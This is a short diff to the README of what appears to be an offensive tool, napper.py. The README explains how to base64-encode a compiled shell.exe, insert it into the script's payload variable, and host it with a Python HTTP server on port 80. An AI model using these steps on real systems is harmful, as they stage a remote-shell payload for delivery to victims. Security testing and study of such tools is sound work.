@@ -14,7 +14,7 @@ Once compiled, use the following command to obtain the base64-encoded string:
 cat shell.exe | base64 | xclip -sel clip
 ```
 
-Paste this string into the Python script (napper.py). Once you have the Python script ready, start a local server with Python:
+Paste this string into the Python script (napper.py) replace the payload variable!. Once you have the Python script ready, start a local server with Python:
 
 ```bash
 sudo python -m http.server 80
